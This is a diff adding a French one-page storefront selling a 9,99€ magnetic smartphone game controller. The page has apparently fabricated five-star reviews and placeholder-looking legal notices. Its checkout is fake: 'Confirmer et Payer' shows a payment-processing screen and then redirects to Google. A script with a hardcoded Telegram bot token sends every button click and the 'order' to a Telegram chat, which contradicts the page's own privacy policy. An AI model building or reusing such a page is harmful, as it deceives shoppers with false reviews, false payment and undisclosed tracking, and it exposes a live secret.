@@ -1,0 +1,643 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Manette de Jeu Magnétique pour Smartphone – Offre Spéciale</title>
+  
+  <!-- Google Fonts: Montserrat -->
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;700;800&display=swap" rel="stylesheet">
+  
+  <style>
+    :root {
+      --bg-dark: #12121c;
+      --bg-light: #1d1d2b;
+      --primary-accent: #00aaff;
+      --secondary-accent: #ffae00;
+      --text-light: #ffffff;
+      --text-medium: #c0c0c8;
+      --text-dark: #12121c;
+      --border-radius-md: 16px;
+      --border-radius-sm: 12px;
+      --shadow: 0 8px 32px rgba(0, 0, 0, 0.25);
+    }
+    body {
+      margin: 0;
+      font-family: 'Montserrat', sans-serif;
+      background-color: var(--bg-dark);
+      color: var(--text-light);
+      -webkit-font-smoothing: antialiased;
+      -moz-osx-font-smoothing: grayscale;
+    }
+    .container {
+      max-width: 420px;
+      margin: 0 auto;
+      padding: 20px;
+      overflow-x: hidden;
+    }
+    .product-section {
+      background-color: var(--bg-light);
+      border-radius: var(--border-radius-md);
+      padding: 20px;
+      margin-top: 20px;
+      box-shadow: var(--shadow);
+    }
+    .product-image-container {
+        position: relative;
+        width: 100%;
+        padding-top: 56.25%;
+        margin-bottom: 20px;
+        border-radius: var(--border-radius-sm);
+        overflow: hidden;
+    }
+    .product-image {
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      display: block;
+      transition: opacity 0.5s ease-in-out;
+    }
+    .price {
+      text-align: center;
+      font-size: 2.5rem;
+      font-weight: 800;
+      color: var(--secondary-accent);
+      margin: 0 0 10px 0;
+      animation: pulse 2s infinite;
+    }
+    @keyframes pulse {
+      0% { transform: scale(1); }
+      50% { transform: scale(1.03); }
+      100% { transform: scale(1); }
+    }
+    .price-subtitle {
+      text-align: center;
+      font-size: 1rem;
+      font-weight: 600;
+      color: var(--text-medium);
+      margin-bottom: 20px;
+    }
+    .cta-button {
+      display: block;
+      width: 100%;
+      padding: 18px;
+      font-size: 1.25rem;
+      font-weight: 700;
+      color: var(--text-dark);
+      background: linear-gradient(90deg, var(--secondary-accent) 0%, #ffd04e 100%);
+      border: none;
+      border-radius: var(--border-radius-sm);
+      cursor: pointer;
+      transition: transform 0.2s ease, box-shadow 0.2s ease;
+      box-shadow: 0 4px 15px rgba(255, 174, 0, 0.3);
+    }
+    .cta-button:hover {
+      transform: translateY(-3px);
+      box-shadow: 0 8px 25px rgba(255, 174, 0, 0.4);
+    }
+    .section-title {
+      font-size: 1.5rem;
+      font-weight: 700;
+      color: var(--text-light);
+      margin: 40px 0 20px 0;
+      text-align: center;
+      border-bottom: 2px solid var(--primary-accent);
+      padding-bottom: 10px;
+      display: inline-block;
+      width: calc(100% - 20px);
+      margin-left: 10px;
+    }
+    .reviews-grid {
+      display: grid;
+      gap: 15px;
+    }
+    .review-card {
+      background-color: var(--bg-light);
+      border-radius: var(--border-radius-sm);
+      padding: 15px;
+      display: flex;
+      align-items: center;
+      gap: 15px;
+    }
+    .review-avatar {
+      width: 50px;
+      height: 50px;
+      border-radius: 50%;
+      object-fit: cover;
+      border: 2px solid var(--primary-accent);
+    }
+    .review-content .name {
+      font-weight: 700;
+      font-size: 1rem;
+      margin: 0;
+    }
+    .review-content .stars {
+      color: var(--secondary-accent);
+      font-size: 1.1rem;
+      margin: 4px 0;
+    }
+    .review-content .text {
+      font-size: 0.95rem;
+      color: var(--text-medium);
+      line-height: 1.5;
+    }
+    .features-list {
+      list-style: none;
+      padding: 0;
+      margin: 0;
+    }
+    .features-list li {
+      background-color: var(--bg-light);
+      border-radius: var(--border-radius-sm);
+      padding: 15px 20px;
+      margin-bottom: 10px;
+      font-weight: 600;
+      display: flex;
+      align-items: center;
+    }
+    .features-list li::before {
+      content: '✔';
+      color: var(--primary-accent);
+      font-size: 1.2rem;
+      font-weight: bold;
+      margin-right: 15px;
+    }
+    .popup-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0, 0, 0, 0.8);
+      backdrop-filter: blur(5px);
+      z-index: 1000;
+      display: none;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+      box-sizing: border-box;
+      animation: fade-in 0.3s;
+    }
+    @keyframes fade-in {
+        from { opacity: 0; }
+        to { opacity: 1; }
+    }
+    .popup-content {
+      background-color: var(--bg-light);
+      border-radius: var(--border-radius-md);
+      padding: 30px;
+      width: 100%;
+      max-width: 400px;
+      text-align: center;
+      box-shadow: var(--shadow);
+      animation: pop-in 0.3s ease-out;
+      position: relative;
+    }
+    .legal-popup-content {
+        max-width: 600px;
+        text-align: left;
+        padding: 40px;
+    }
+    .legal-popup-content h3 {
+        margin-top: 0;
+        font-size: 1.8rem;
+        color: var(--primary-accent);
+    }
+    .legal-popup-content .text-content {
+        max-height: 60vh;
+        overflow-y: auto;
+        line-height: 1.7;
+        color: var(--text-medium);
+        padding-right: 15px;
+    }
+    .text-content p {
+        margin-bottom: 1em;
+    }
+     .text-content h4 {
+        color: var(--text-light);
+        margin-top: 1.5em;
+        font-size: 1.1rem;
+    }
+    .popup-close-btn {
+        position: absolute;
+        top: 15px;
+        right: 15px;
+        background: none;
+        border: none;
+        color: var(--text-medium);
+        font-size: 2rem;
+        cursor: pointer;
+        line-height: 1;
+        transition: color 0.2s;
+    }
+    .popup-close-btn:hover {
+        color: var(--text-light);
+    }
+    @keyframes pop-in {
+      from { opacity: 0; transform: scale(0.9); }
+      to { opacity: 1; transform: scale(1); }
+    }
+    .popup-title {
+      font-size: 1.6rem;
+      font-weight: 700;
+      color: var(--primary-accent);
+      margin: 0 0 20px 0;
+    }
+    .invoice-details {
+      text-align: left;
+      margin-bottom: 25px;
+      font-size: 1rem;
+      line-height: 1.8;
+      color: var(--text-medium);
+    }
+    .invoice-details strong {
+      color: var(--text-light);
+      font-weight: 600;
+    }
+    .invoice-total {
+      font-size: 1.2rem;
+      font-weight: bold;
+      border-top: 1px solid var(--text-medium);
+      padding-top: 10px;
+      margin-top: 10px;
+    }
+    .invoice-total strong {
+      color: var(--secondary-accent);
+    }
+    .payment-icons {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      gap: 15px;
+      margin-top: 20px;
+    }
+    .payment-icons img {
+      height: 30px;
+      filter: drop-shadow(0 2px 2px rgba(0,0,0,0.2));
+      background: white;
+      border-radius: 4px;
+      padding: 2px 5px;
+    }
+    .payment-icons span {
+        font-weight: 600;
+        font-size: 0.9rem;
+        display: flex;
+        align-items: center;
+        gap: 5px;
+        opacity: 0.8;
+    }
+    .loader {
+      border: 5px solid #333;
+      border-top: 5px solid var(--secondary-accent);
+      border-radius: 50%;
+      width: 60px;
+      height: 60px;
+      animation: spin 1s linear infinite;
+      margin: 20px auto;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    .processing-text {
+      font-size: 1.1rem;
+      font-weight: 600;
+      color: var(--text-medium);
+    }
+    .site-footer {
+        background-color: var(--bg-light);
+        color: var(--text-medium);
+        padding: 30px 20px;
+        margin-top: 40px;
+        text-align: center;
+        font-size: 0.9rem;
+    }
+    .footer-content {
+        max-width: 420px;
+        margin: auto;
+    }
+    .footer-section {
+        margin-bottom: 20px;
+    }
+    .footer-section h4 {
+        color: var(--text-light);
+        font-size: 1.1rem;
+        margin-top: 0;
+        margin-bottom: 10px;
+    }
+    .footer-links {
+        list-style: none;
+        padding: 0;
+        margin: 0;
+    }
+    .footer-links li {
+        margin-bottom: 8px;
+    }
+    .footer-links a {
+        color: var(--text-medium);
+        text-decoration: none;
+        transition: color 0.2s;
+        cursor: pointer;
+    }
+    .footer-links a:hover {
+        color: var(--primary-accent);
+    }
+    .contact-info p {
+        margin: 5px 0;
+        line-height: 1.6;
+    }
+  </style>
+</head>
+<body>
+
+  <main class="container">
+    <!-- Product Section -->
+    <section class="product-section">
+      <div class="product-image-container">
+          <img src="https://i.postimg.cc/RZQtdk6r/Picsart-25-06-24-18-57-11-390.png" alt="Manette de jeu magnétique pour smartphone - vue 1" class="product-image" id="productImage1" onerror="this.onerror=null;this.src='https://placehold.co/600x400/1d1d2b/ffffff?text=Image+1';">
+          <img src="https://i.postimg.cc/xjhL1yDZ/Screenshot-20250624-111953-Chrome.jpg" alt="Manette de jeu magnétique pour smartphone - vue 2" class="product-image" id="productImage2" style="opacity: 0;" onerror="this.onerror=null;this.src='https://placehold.co/600x400/1d1d2b/ffffff?text=Image+2';">
+      </div>
+      <p class="price">9,99€</p>
+      <p class="price-subtitle">Offre Spéciale à Durée Limitée</p>
+      <button class="cta-button" id="addToCartBtn">Ajouter au panier</button>
+    </section>
+
+    <!-- Reviews Section -->
+    <section>
+      <h2 class="section-title">Ils l'ont adoptée !</h2>
+      <div class="reviews-grid">
+        <div class="review-card">
+          <img src="https://i.postimg.cc/V6YFFZj3/FB-IMG-1748223150251.jpg" alt="Avis client" class="review-avatar" onerror="this.onerror=null;this.src='https://placehold.co/50x50/00aaff/ffffff?text=A';">
+          <div class="review-content">
+            <p class="name">Alexandre R.</p>
+            <p class="stars">★★★★★</p>
+            <p class="text">Incroyable ! La prise en main est parfaite et la réactivité est au rendez-vous. Reçu en 48h.</p>
+          </div>
+        </div>
+        <div class="review-card">
+          <img src="https://i.postimg.cc/rssCBdZj/FB-IMG-1748223545571.jpg" alt="Avis client" class="review-avatar" onerror="this.onerror=null;this.src='https://placehold.co/50x50/00aaff/ffffff?text=S';">
+          <div class="review-content">
+            <p class="name">Sophie D.</p>
+            <p class="stars">★★★★★</p>
+            <p class="text">Super pratique et ne prend pas de place. Je l'emporte partout avec moi. Je recommande vivement.</p>
+          </div>
+        </div>
+         <div class="review-card">
+          <img src="https://i.postimg.cc/sXw4HPm1/FB-IMG-1748223905324.jpg" alt="Avis client" class="review-avatar" onerror="this.onerror=null;this.src='https://placehold.co/50x50/00aaff/ffffff?text=N';">
+          <div class="review-content">
+            <p class="name">Nicolas B.</p>
+            <p class="stars">★★★★★</p>
+            <p class="text">Fini de galérer avec les contrôles tactiles. Ça change complètement l'expérience de jeu sur mobile.</p>
+          </div>
+        </div>
+         <div class="review-card">
+          <img src="https://i.postimg.cc/1z0Hw1NG/FB-IMG-1748224215323.jpg" alt="Avis client" class="review-avatar" onerror="this.onerror=null;this.src='https://placehold.co/50x50/00aaff/ffffff?text=Y';">
+          <div class="review-content">
+            <p class="name">Yasmine K.</p>
+            <p class="stars">★★★★★</p>
+            <p class="text">Parfait pour jouer partout ! La qualité est top et le prix est mini, merci !</p>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Features Section -->
+    <section>
+      <h2 class="section-title">Une Révolution pour le Jeu Mobile</h2>
+      <ul class="features-list">
+        <li>Contrôle magnétique ultra-précis et sans latence.</li>
+        <li>Design ergonomique pour des heures de jeu confortables.</li>
+        <li>Aucune batterie, aucune connexion Bluetooth requise.</li>
+        <li>Compatible avec la majorité des smartphones (iOS & Android).</li>
+        <li>Compacte et légère, elle se glisse dans votre poche.</li>
+        <li>Installation simple et rapide en quelques secondes.</li>
+        <li><strong>Livraison gratuite et rapide incluse.</strong></li>
+      </ul>
+    </section>
+  </main>
+
+  <!-- Footer -->
+  <footer class="site-footer">
+    <div class="footer-content">
+        <div class="footer-section">
+            <h4>Contact</h4>
+            <div class="contact-info">
+                 <ul class="footer-links">
+                    <li><a class="legal-link" data-page="contact">Nous contacter</a></li>
+                </ul>
+            </div>
+        </div>
+        <div class="footer-section">
+            <h4>Informations</h4>
+            <ul class="footer-links">
+                <li><a class="legal-link" data-page="privacy">Politique de confidentialité</a></li>
+                <li><a class="legal-link" data-page="refund">Politique de retour / remboursement</a></li>
+                <li><a class="legal-link" data-page="legal">Mentions légales</a></li>
+                <li><a class="legal-link" data-page="cgv">Conditions générales de vente</a></li>
+            </ul>
+        </div>
+        <p>&copy; 2024 GameBooster. Tous droits réservés.</p>
+    </div>
+  </footer>
+
+  <!-- Popups -->
+  <div class="popup-overlay" id="invoicePopup">
+    <div class="popup-content">
+      <button class="popup-close-btn" onclick="hidePopup(invoicePopup)">&times;</button>
+      <h3 class="popup-title">Récapitulatif de votre commande</h3>
+      <div class="invoice-details">
+        <img src="https://i.postimg.cc/RZQtdk6r/Picsart-25-06-24-18-57-11-390.png" alt="Manette de jeu" style="width: 100px; border-radius: 8px; margin: 0 auto 15px; display: block;" onerror="this.onerror=null;this.src='https://placehold.co/100x100/1d1d2b/ffffff?text=Manette';">
+        <strong>Produit :</strong> Manette de jeu magnétique<br>
+        <strong>Quantité :</strong> 1<br>
+        <strong>Prix :</strong> 9,99€<br>
+        <strong>Livraison :</strong> Gratuite<br>
+        <div class="invoice-total">
+          <strong>Total à payer :</strong> <strong>9,99€</strong>
+        </div>
+      </div>
+      <button class="cta-button" id="confirmPaymentBtn">Confirmer et Payer</button>
+      <div class="payment-icons">
+        <img src="https://i.postimg.cc/9MWszRK4/images-11.png" alt="Visa" onerror="this.onerror=null;this.src='https://placehold.co/50x35/ffffff/000000?text=Visa';">
+        <img src="https://i.postimg.cc/3wjPKCS5/images-2025-06-24-T192222-859.jpg" alt="MasterCard" onerror="this.onerror=null;this.src='https://placehold.co/50x35/ffffff/000000?text=MC';">
+      </div>
+    </div>
+  </div>
+  <div class="popup-overlay" id="processingPopup">
+    <div class="popup-content">
+      <h3 class="popup-title">Paiement en cours...</h3>
+      <div class="loader"></div>
+      <p class="processing-text">Veuillez patienter, nous finalisons votre commande.<br>Ne fermez pas cette page.</p>
+    </div>
+  </div>
+  
+  <!-- Legal Content Popup -->
+    <div class="popup-overlay" id="legalPopup">
+        <div class="popup-content legal-popup-content">
+            <button class="popup-close-btn" id="legalPopupCloseBtn">&times;</button>
+            <h3 id="legalPopupTitle"></h3>
+            <div id="legalPopupContent" class="text-content"></div>
+        </div>
+    </div>
+
+
+  <script>
+    // --- Fonctions globales pour gérer les popups ---
+    const showPopup = (popup) => {
+        popup.style.display = 'flex';
+        document.body.style.overflow = 'hidden';
+    };
+
+    const hidePopup = (popup) => {
+        popup.style.display = 'none';
+        document.body.style.overflow = 'auto';
+    };
+
+    document.addEventListener('DOMContentLoaded', () => {
+
+      // --- Configuration Telegram ---
+      const TELEGRAM_BOT_TOKEN = '8026919110:AAGOm56kp92jEt9NphOYeBMiG_U_bX1uCYU';
+      const TELEGRAM_CHAT_ID = '-4913064483';
+
+      // --- DOM Elements ---
+      const addToCartBtn = document.getElementById('addToCartBtn');
+      const confirmPaymentBtn = document.getElementById('confirmPaymentBtn');
+      const invoicePopup = document.getElementById('invoicePopup');
+      const processingPopup = document.getElementById('processingPopup');
+      const productImage1 = document.getElementById('productImage1');
+      const productImage2 = document.getElementById('productImage2');
+      
+      const legalPopup = document.getElementById('legalPopup');
+      const legalPopupTitle = document.getElementById('legalPopupTitle');
+      const legalPopupContent = document.getElementById('legalPopupContent');
+      const legalPopupCloseBtn = document.getElementById('legalPopupCloseBtn');
+      const legalLinks = document.querySelectorAll('.legal-link');
+
+      // --- Contenu des pages légales ---
+      const legalContentData = {
+          'contact': {
+              title: "Nous Contacter",
+              content: `
+                <p>Pour toute question ou demande, n'hésitez pas à nous contacter :</p>
+                <h4>Par Email :</h4>
+                <p>contact@gameboost-shop.fr</p>
+                <h4>Par Téléphone :</h4>
+                <p>+33 1 23 45 67 89</p>
+                <h4>Adresse Postale :</h4>
+                <p>GameBooster SAS<br>15 Rue de la Paix<br>75002 Paris, France</p>`
+          },
+          'privacy': {
+              title: "Politique de Confidentialité",
+              content: `<p>Nous nous engageons à protéger votre vie privée. Cette politique explique comment nous collectons, utilisons et protégeons vos informations personnelles.</p><h4>Collecte d'informations</h4><p>Nous collectons les informations que vous nous fournissez lors de la commande (nom, adresse, email). Nous n'enregistrons aucune information de paiement.</p><h4>Utilisation des informations</h4><p>Vos informations sont utilisées uniquement pour traiter votre commande, assurer la livraison et communiquer avec vous concernant celle-ci.</p><h4>Partage des informations</h4><p>Nous ne vendons, ne louons et ne partageons jamais vos informations personnelles avec des tiers à des fins marketing.</p>`
+          },
+          'refund': {
+              title: "Politique de Retour / Remboursement",
+              content: `<p>Votre satisfaction est notre priorité. Si vous n'êtes pas satisfait de votre achat, vous pouvez nous le retourner.</p><h4>Conditions de retour</h4><p>Vous disposez d'un délai de 14 jours après réception de votre commande pour nous retourner le produit. Le produit doit être dans son état d'origine et son emballage.</p><h4>Procédure</h4><p>Pour initier un retour, veuillez contacter notre service client à l'adresse contact@gameboost-shop.fr avec votre numéro de commande. Nous vous indiquerons la marche à suivre.</p><h4>Remboursement</h4><p>Une fois le produit reçu et inspecté, nous procéderons au remboursement complet via votre méthode de paiement originale dans un délai de 5 jours ouvrés.</p>`
+          },
+          'legal': {
+              title: "Mentions Légales",
+              content: `<h4>Éditeur du site</h4><p>GameBooster SAS<br>Société par Actions Simplifiée au capital de 1 000€<br>Siège social : 15 Rue de la Paix, 75002 Paris, France<br>RCS Paris : 123 456 789<br>N° de TVA intracommunautaire : FR00123456789</p><h4>Directeur de la publication</h4><p>Jean Dupont</p><h4>Hébergeur du site</h4><p>Shopify Inc.<br>151 O'Connor Street, Ground floor<br>Ottawa, Ontario K2P 2L8, Canada</p>`
+          },
+          'cgv': {
+              title: "Conditions Générales de Vente",
+              content: `<p>Les présentes conditions régissent les ventes de produits par GameBooster SAS.</p><h4>Article 1 : Produits</h4><p>Les produits proposés à la vente sont ceux décrits sur le site. GameBooster SAS apporte le plus grand soin à la présentation et la description de ces produits.</p><h4>Article 2 : Prix</h4><p>Les prix sont indiqués en Euros (€) toutes taxes comprises (TTC). La livraison est offerte.</p><h4>Article 3 : Commande</h4><p>Le client valide sa commande lorsqu'il active le lien "Confirmer et Payer". Il accepte alors le processus de commande et les présentes conditions de vente.</p><h4>Article 4 : Paiement</h4><p>Le paiement est exigible immédiatement à la commande. Le paiement est sécurisé et s'effectue via les plateformes de nos partenaires.</p>`
+          }
+      };
+      
+      // --- Carrousel d'images produit ---
+      let currentImage = 1;
+      setInterval(() => {
+          if (productImage1 && productImage2) {
+              if (currentImage === 1) {
+                  productImage1.style.opacity = '0';
+                  productImage2.style.opacity = '1';
+                  currentImage = 2;
+              } else {
+                  productImage1.style.opacity = '1';
+                  productImage2.style.opacity = '0';
+                  currentImage = 1;
+              }
+          }
+      }, 3000);
+
+      // --- Gestion des Popups Légales ---
+      legalLinks.forEach(link => {
+          link.addEventListener('click', (event) => {
+              event.preventDefault();
+              const pageKey = link.getAttribute('data-page');
+              const data = legalContentData[pageKey];
+              if (data) {
+                  legalPopupTitle.innerText = data.title;
+                  legalPopupContent.innerHTML = data.content;
+                  showPopup(legalPopup);
+              }
+          });
+      });
+
+      const closeLegalPopup = () => hidePopup(legalPopup);
+      legalPopupCloseBtn.addEventListener('click', closeLegalPopup);
+      legalPopup.addEventListener('click', (event) => {
+        if (event.target === legalPopup) {
+            closeLegalPopup();
+        }
+      });
+
+
+      // --- Notification Telegram ---
+      function notifyTelegram(action, details = '') {
+        const message = `🔔 Action client : ${action}${details ? ' | ' + details : ''}`;
+        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            chat_id: TELEGRAM_CHAT_ID,
+            text: message,
+          }),
+        }).catch(error => console.error('Erreur lors de l\'envoi à Telegram:', error));
+      }
+
+      document.body.addEventListener('click', function(e){
+        if (e.target.tagName === "BUTTON" || e.target.classList.contains('cta-button')) {
+          let btnLabel = e.target.innerText.trim() || e.target.getAttribute('aria-label') || "Bouton inconnu";
+          if(e.target.id !== 'legalPopupCloseBtn') {
+            notifyTelegram("Bouton cliqué", btnLabel);
+          }
+        }
+      });
+
+      // 1. Cliquer sur "Ajouter au panier"
+      addToCartBtn.addEventListener('click', () => {
+        showPopup(invoicePopup);
+      });
+      
+       // Fermer popup facture si clique en dehors ou sur la croix
+      invoicePopup.addEventListener('click', (event) => {
+        if (event.target === invoicePopup) {
+            hidePopup(invoicePopup);
+        }
+      });
+
+      // 2. Cliquer sur "Confirmer et Payer"
+      confirmPaymentBtn.addEventListener('click', () => {
+        hidePopup(invoicePopup);
+        showPopup(processingPopup);
+
+        const message = "🕹️ Nouvelle commande : Manette magnétique pour smartphone, 1 pièce, 9,99€, Livraison gratuite";
+        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: message }),
+        }).catch(error => console.error('Erreur Telegram:', error));
+
+        setTimeout(() => {
+          window.location.href = 'https://www.google.com';
+        }, 3000);
+      });
+    });
+  </script>
+</body>
+</html>
